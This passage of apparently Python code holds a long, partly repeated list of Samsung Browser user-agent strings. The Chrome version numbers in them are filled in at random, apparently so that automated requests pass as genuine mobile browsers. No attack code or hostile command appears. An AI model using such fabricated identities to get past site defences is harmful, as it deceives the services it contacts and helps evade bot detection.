5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A225M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S326DL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F926U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A102W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J737T1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F711U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; 2107113SG) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-F916U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A225M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S326DL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F926U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A102W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J737T1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F711U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; 2107113SG) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-F916U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A225M) AppleWebKit/537.36 (KHTML, like Gecko) 